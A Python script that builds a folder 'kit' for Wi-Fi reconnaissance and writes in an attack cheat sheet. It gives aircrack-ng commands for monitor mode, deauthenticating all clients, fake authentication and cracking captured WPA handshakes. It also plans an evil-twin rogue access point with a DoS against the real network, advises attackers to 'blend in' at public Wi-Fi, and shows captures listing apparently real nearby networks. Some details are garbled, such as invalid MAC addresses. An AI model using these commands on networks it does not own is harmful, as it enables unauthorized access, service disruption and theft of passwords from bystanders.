#!/user/bin python3

# Disclaimer: This script is for educational purposes only.  
# Do not use against any network that you don't own or have authorization to test. 

# CREATES INDIVIDUAL CATEGORIZED FOLDERS FOR ANY RECONNAISSANCE
# Note: If ran in sudo Permissions will default to "Locked" 

import os

def sub_banner():
    version = "1.0"
    ascii_banner = f"""                                                                                                                                                       

____ _  _ ___  ____ ____ _    ___  ____ ____  ___  _   _ 
[__  |  | |__] |___ |  | |    |  \ |___ |__/  |__]  \_/  
___] |__| |__] |    |__| |___ |__/ |___ |  \ .|      |   
                                                         

    """
    print(ascii_banner)

sub_banner()

x = ' '
spam = 'Автор: калистамп '
print(spam.title())
print(x*2)

main = input(f'Enter_Date_of_Todays_Wrk:  ')
print(x*2)
sub_one = f'{main}/Sharkcaps/'
sub_one_a = f'{main}/Sharkcaps/Main'
sub_two = f'{main}/Word_li/'
sub_tree = f'{main}/Hashcat/'
sub_four = f'{main}/AP/'
sub_five = f'{main}/Xtras/'

os.mkdir(main, mode=0o777)      # "0o777" is Defauly Mode to unlock all permissions ...
os.mkdir(sub_one, mode=0o777)
os.mkdir(sub_one_a, mode=0o777)
os.mkdir(sub_two, mode=0o777)
os.mkdir(sub_tree, mode=0o777)
os.mkdir(sub_four, mode=0o777)
os.mkdir(sub_five, mode=0o777)

# [ "os.chmod" can change the permissions of anyy Directory or File created by "os", or any other arugment you use such as "open/write" ]

text_input = 'Text Input - [ PMKID = Only part of the Handshake was aquired ]'
main_commands = """

sudo airmon-ng 

sudo airmon-ng start wlan0

sudo airodump-ng --band a wlan0mon -w main

airodump-ng wlan0mon -c 11 --bssid E8:2C:6D:00:00 -w <network_name>

aireplay-ng -0 15 -a 1C:9E:CC:00:00 -c 3C:2E:FF:00:00

aireplay-ng -1 0 -e teddy -a 00:14:7K:6E:40:80 -h 00:0F:9K:68:9K:82 wlan0mon



"""
tools = """

( Common Wireless Methods: Packet Sniffing | Jamming | Brute-Cracking | Evil Twin | Rogue Acces Point | W.r Chalking )

Huge List of Resources 

https://github.com/0x90/wifi-arsenal

CUPP - Common User Passwords Profiler

https://github.com/Mebus/cupp

Remove duplicates from MASSIVE wordlist, without sorting it (for dictionary-based password cracking)

https://github.com/nil0x42/duplicut

Network Forensic Analysis Tool (NFAT) that processing and inspection of network traffic (mainly PCAP files, but it also capable of directly live capturing from a network interface)

https://github.com/odedshimon/BruteShark

Rogue Access Point framework

https://github.com/wifiphisher/wifiphisher

Used to audit wireless networks with many features

https://github.com/v1s1t0r1sh3r3/airgeddon

    """
MEAT = """

Tools:

airmon-ng
airodump-ng
aireplay-ng
aircrack-ng
Monitoring, Recon and Dumping

Using the aircrack-ng suite, Turn on the monitor mode

                                sudo airmon-ng start wlan0

Simple passive listening and capture, Used to discover AP in the environment

                                sudo airodump-ng --band a wlan0mon -w main

Targeted listening and capture, Focus on one AP and one channel

                   airodump-ng wlan0mon -c 11 --bssid E8:2C:6D:00:00 -w sonic

Attacking WEP

WEP is an old encryption protocol but still used in some places, It is vulnerable to direct cracking attacks

Here, you want to get the 4-way WPA Handshake, It requires network traffic between the AP and one device

The process can be enhanced by sending deauth packets – – You can Deauth Packets to every device on the Network with “-a” … or you can target a specific device on the Network by adding “-c”

Aireplay Command used to send Deauth Packets “0” (See sources for more reference)
Deauth connected devices while airodump is running in a separate Terminal to initiate authentication process and try to get the handshake

In the airodump-ng Terminal, the WPA handshake will appear once captured

                       aireplay-ng -0 15 -a 1C:9E:CC:00:00 -c 3C:2E:FF:00:00 wlan0mon

- 0 means deauthentitcation - - 15 is number of deauths sent

- a mac address of access point

- c mac address of the client (station #) (This is optional, you can choose to not add this and knock all devices off network)
- wlan0mon is the interface name
# Another possibility is to use fake authentication to generate IV

# -1 = fake authentication

# 0 = delay between association demands

# -e = AP ESSID (name)

# -a = AP MAC

# -h = attacker MAC

                    aireplay-ng -1 0 -e teddy -a 00:14:7K:6E:40:80 -h 00:0F:9K:68:9K:82 wlan0mon

# ARP Sniffing and injection is another method

Aircrack-ng too directly crack the WEP Key

Cracking can be done using aircrack-ng

Note: Use a good Wordlist !

       aircrack-ng -a2 -b 28:33:88:0A:3A:CB -w '/home/lock/28:33:68:0A:6A:CB/why_.txt' '/home/lock/beyond-01.cap'

- a [a.mode]: force attack mode (1/WEP, 2/WPA-PSK)
- b [bssid]: target selection: access point's MAC
- w [words]: path to wordlist(s) filename(s)
- Drag and drop the .cap file

Introduction

Running "sudo airmon-ng check kill" should be used every time you launch Wi-Fi attacks to ensure there is no other applications that will interfere with our attacks. Good habit to do this every time you plan on hacking a Wi-Fi network.

WPA/WPA2 requires a minimum password of 8 chracters so we need to be using a wordlist that contains passwords >8 characters.

When you're using the tools needed to hack Wi-Fi networks you'll notice the Power/PWR level is displayed in dBi or "db" sometimes with a "-" sign before the number displayed. It doesn't matter which tool you plan on using (airodump-ng, wifite, etc.) since they all display the "Power" level a little differently but all represent the "db/dBi. Notice the power levels 

Hardware and Setup:

It's important to understand that a wireless antenna improves the tranmission and reception of the radiofrequency (RF) signals giving you a reliable connection to the Wi-Fi network. The gain provided by an antenna is measured in Decibels Isotropic (dBi) which is what's represented when you're looking for wireless networks to connect in order to determine which one has the best connection.

Yagi" antennas are known for connecting to a Wi-Fi network from a distance and are widely used in the hacker community. These are best suited when targeting a Wi-Fi network from a great distance. 

Imagine someone thinking something was peculiar about their internet connection at a public Wi-Fi and seeing someone with strange antennas, stickers on their laptop, wearing a top hat, and looking up to no good sitting there. It's just not good. Blend in. Keep your laptop clean looking, keep professional, and appear to be a normal plain user , NO STICKERS ALLOWED

If you encounter an issue with your USBs and Kali won't start without an error this is most likely because you don't have a USB 2.0 or 3.0 port. Make sure your Alfa card is plugged in and attached to your Kali VM with the proper USB settings selected for it. If you do not have a USB 3.0 or USB 2.0 port on your computer you won't be able to use the Alfa network cards recommended in this course and will not be able to continue.

START:

Instead of me explaining every technical detail about WEP, WPS, and WPA/WPA2 WiFi networks I'll direct you to an excellent resource

< https[.]//wwwyoutube.com/watch?v=QHo2hCzxMr0 >

Capture the three way handhsake from the Access Point you are looking to target and crack, Usually this is done by Deauthing a device on the network your monitoring or using "hcxdumptool" 

USE THESE TOOLS - -

airmon-ng
airodump-ng
aireplay-ng

Now at some point you're going to realize you're not able to crack every Wi-Fi network you come across and not every Wi-Fi network can be cracked or hacked. It depends on a lot of factors like signal strength, location, password complexity, etc. 

Cleaning cap file with 'WPA Clean' :

To utilize hashcat we must first turn the .cap file into a workable format for hashcat. Go to the directory that wifite saved the .cap file of the network you're trying to crack and have had no success using default wordlists on.

Using "wpaclean" you can covert your .cap file into the correct format required for hashcat 

[ wpaclean NEW.cap handshake.cap ]

How to view/split handshakes on cap file using airerack-ng:

It is important to understand the difference between a file in which several handshakes are simply merged and a capture file in a noisy environment. An example of analyzing a file of the first type (using aircrack-ng ):

[ aircrack-ng FILE_NAME.cap ]

# Example is a local AP "main" list ,to checked to see if WPA Handshake was properly achieved :

aircrack-ng '/home/sock/Documents/wifi/3_27_22/AP/main/main-01.cap' 
Reading packets, please wait...
Opening /home/sock/Documents/wifi/3_27_22/AP/main/main-01.cap
Read 27874 packets.

   #  BSSID              ESSID                     Encryption

   1  0C:7C:44:A6:FC:6C  Bethany                   WPA (0 handshake)
   2  0C:7C:26:A6:FC:6D  ATTBethany_Guest          WPA (0 handshake)
   3  0C:7C:22:A6:FC:6E                            Unknown
   4  10:0C:68:3C:89:84  ACCESS_DENIED             WPA (0 handshake)
   5  10:0C:64:3E:FD:24                            Unknown
   6  10:33:B7:74:42:E9  Bombadillo                Unknown
   7  12:62:65:CC:59:61  DIRECT-61-HP ENVY 5000 series  Unknown
   8  16:0C:6B:3C:89:84                            Unknown
   9  16:0C:6B:6E:FD:24  ACCESS_DENIED             WPA (0 handshake)
  10  1C:9E:CC:61:AE:FA  GPKG                      Unknown
  11  1C:9E:CC:68:BE:5F  PlayasBall                WPA (0 handshake)
  12  1E:9E:CC:62:AE:FB                            Unknown

		{ EXAMPLE TWO - - }

# Example is a local AP "hillhouse" , checked to see if WPA Handshake was properly achieved :


aircrack-ng '/home/sock/Desktop/4_18_22/w1f1_k1t/SharkCaps/hillhouse/newhouse.cap' 
Reading packets, please wait...
Opening /home/sock/Desktop/4_18_22/w1f1_k1t/SharkCaps/hillhouse/newhouse.cap
Read 3 packets.

   #  BSSID              ESSID                     Encryption

   1  88:41:6C:FA:79:B2  Hillhouse1                WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening newhouse.cap
Read 3 packets.

# END

Viewing cap files in Wireshark:

After opening the file, install the filter [eapol] by using bookmark menu -- Analyze -- Display Filters... - - add the filter eapol.

You can then filter by BSSID in the above search bar :

 wlan.addr==<BSSID HERE>

Requirements to check if Handshake is suitable for cracking -

[ If it necessarily includes the second element (M2), as well as the third (M3) (ensures that the connection to the network was made) or instead of the third element contains the first element (M1) (the handshake is suitable for breaking the password, but there are no guarantees that connection and that the correct password was entered). Better if you managed to capture all four elements ]

[ elements of a handshake must be in the correct order - there should not be too much timE between them (measured in milliseconds and microseconds). ]


EvilTwin Cracking:

Passive Bruteforce attacks failed, Moving onto Engaging Target is the next option 

As you've learned from watching the videos in the Wi-Fi megaprimer you're able to setup your own access point and name it whatever you'd like. If you're targeting "HOME-Wi-Fi" then you would set your rogue AP up to broadcast "HOME-Wi-Fi" as well. One network card will be used to bring up your rogue AP and the other network card will be used to launch a Denial of Service (DoS) attack against the real "HOME-Wi-Fi". The goal with the DoS attack is to overwhelm and take down the real "HOME-Wi-Fi" preventing people from connecting to it while at the same time bringing up your rogue AP tricking people into connecting to you instead. The victims will think they're connecting to their "HOME-Wi-Fi" network and not realize they are indeed connected directly to you

They will click and search for their Wi-Fi network or at least troubleshoot a little bit

Tools we will be using:
wifiphisher
airgeddon
wifipumpkin3


Sources:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa

https://www.aircrack-ng.org/doku.php?id=newbie_guide

https://www.aircrack-ng.org/doku.php?id=compatibility_drivers

https://www.aircrack-ng.org/doku.php?id=wpa_capture

https://shehackske.medium.com/capturing-and-cracking-wpa-handshake-using-aircrack-ng-d9496f30c7c3

https://cryptokait.com/2020/09/02/taking-password-cracking-to-the-next-level/
Update:

***********************************************************************************
After running, airmon-ng check kill to activate adapter to find AP’s

run, service NetworkManager restart – To turn back on Network wifi
***********************************************************************************
    """

file = open(f"{main}/txt", "w") 
file.write(f'{text_input}')
file.close()

file = open(f"{sub_one_a}/txt", "w")
file.write(f'{main_commands}')
file.close()

file = open(f"{main}/toolz", "w") 
file.write(f'{tools}')
file.close()

file = open(f"{main}/man", "w") 
file.write(f'{MEAT}') 
file.close()

print(' [+] Subfolder Kit Created.')
